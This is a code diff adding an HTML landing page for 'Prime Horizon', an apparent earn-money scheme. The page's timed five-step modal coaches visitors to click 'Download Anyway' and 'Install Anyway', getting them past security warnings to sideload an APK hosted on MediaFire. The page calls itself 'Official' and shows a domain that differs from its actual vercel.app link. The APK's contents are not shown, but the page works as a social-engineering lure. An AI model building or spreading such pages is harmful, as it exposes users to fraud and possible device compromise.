@@ -1,1 +1,114 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRIME HORIZON | Professional Dashboard</title>
+    <style>
+        :root { --gold: #D4AF37; --bg: #f4f7f6; }
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
+
+        /* Welcome Animation */
+        #welcome { position: fixed; inset: 0; background: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; animation: fadeOut 2s forwards 1s; }
+        @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+
+        /* Card Design */
+        .card { width: 100%; max-width: 400px; background: white; padding: 30px; border-radius: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .logo { width: 100px; height: 100px; border-radius: 50%; border: 4px solid var(--gold); margin-bottom: 15px; }
+        h1 { margin: 10px 0; font-size: 1.5rem; color: #1a1a1a; }
+        
+        .btn { background: var(--gold); color: white; padding: 14px 25px; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
+        
+        .web-btn { margin-top: 15px; display: block; padding: 12px; border: 1px solid var(--gold); color: var(--gold); border-radius: 30px; text-decoration: none; font-weight: 600; font-size: 0.95rem; }
+
+        /* Modal Layout */
+        #modal { display: none; position: fixed; inset: 0; background: #fff; z-index: 1000; padding: 20px; overflow-y: auto; }
+        .modal-content { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 90vh; text-align: center; }
+        
+        /* Larger Image Frame with Center Focus */
+        .img-frame { border: 4px solid #fff; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); padding: 5px; margin: 20px 0; max-width: 320px; width: 100%; }
+        .step-img { width: 100%; height: 280px; object-fit: cover; object-position: center; border-radius: 15px; display: block; }
+        
+        .web-info { margin-top: 25px; font-size: 0.9rem; color: #555; border-top: 1px solid #eee; padding-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div id="welcome"><h2>PRIME HORIZON</h2><p>Official Dashboard</p></div>
+
+    <div class="card">
+        <img src="https://i.ibb.co/gZvhB6MC/image-11.jpg" class="logo">
+        <h1>Official Prime Horizon</h1>
+        <p style="color: #666; font-size: 1rem;">Start earning today. Download our official app.</p>
+        <button class="btn" onclick="startFlow()">Download Now</button>
+        <a href="https://primehorizon-taupe.vercel.app/" class="web-btn">Visit Our Website</a>
+    </div>
+
+    <!-- Steps Modal -->
+    <div id="modal">
+        <div class="modal-content">
+            <h3 id="step-title" style="color: var(--gold); font-size: 1.4rem; margin: 0;">Step 1</h3>
+            <div class="img-frame">
+                <img id="step-img" class="step-img" src="">
+            </div>
+            <p id="step-text" style="font-size: 1.1rem; font-weight: 500; margin: 10px 0; padding: 0 10px;"></p>
+            
+            <button class="btn" id="next-btn" onclick="nextStep()" style="max-width: 280px; margin-top: 20px;">Wait 5s...</button>
+            
+            <div class="web-info">
+                <p>Android: Download App | <strong>iOS: Visit our official website</strong></p>
+                <a href="https://primehorizon-taupe.vercel.app/" style="color: var(--gold); font-weight: bold; text-decoration: none;">www.primehorizon.com</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const steps = [
+            { img: "https://i.ibb.co/Z6sZS5wj/IMG-20260707-013953-374.jpg", text: "Click the blue link to begin." },
+            { img: "https://i.ibb.co/23RbQB81/IMG-20260707-014008-093.jpg", text: "Wait 10s and click Download Anyway." },
+            { img: "https://i.ibb.co/C3LsTNjs/IMG-20260707-012749-910.jpg", text: "Open the file and install." },
+            { img: "https://i.ibb.co/TBQftfp2/IMG-20260707-012847-715.jpg", text: "Click 'See more details' if prompted." },
+            { img: "https://i.ibb.co/zWXVdTY6/IMG-20260707-012905-134.jpg", text: "Click 'Install Anyway' to finish." }
+        ];
+
+        let current = 0;
+        steps.forEach(s => { new Image().src = s.img; });
+
+        function startFlow() { document.getElementById('modal').style.display = 'block'; showStep(); }
+
+        function showStep() {
+            const btn = document.getElementById('next-btn');
+            btn.disabled = true;
+            btn.innerText = "Please wait (5s)";
+            
+            document.getElementById('step-title').innerText = `Step ${current + 1}`;
+            document.getElementById('step-img').src = steps[current].img;
+            document.getElementById('step-text').innerText = steps[current].text;
+
+            let time = 5;
+            let timer = setInterval(() => {
+                time--;
+                btn.innerText = `Please wait (${time}s)`;
+                if(time <= 0) {
+                    clearInterval(timer);
+                    btn.disabled = false;
+                    btn.innerText = (current === steps.length - 1) ? "Finish & Download" : "Next";
+                }
+            }, 1000);
+        }
+
+        function nextStep() {
+            if (current < steps.length - 1) {
+                current++;
+                showStep();
+            } else {
+                window.open("https://www.mediafire.com/file/yi24tvjyn1k8fna/Prime+Horizon.apk/file", "_blank");
+                document.getElementById('modal').style.display = 'none';
+                current = 0;
+            }
+        }
+    </script>
+</body>
+</html>
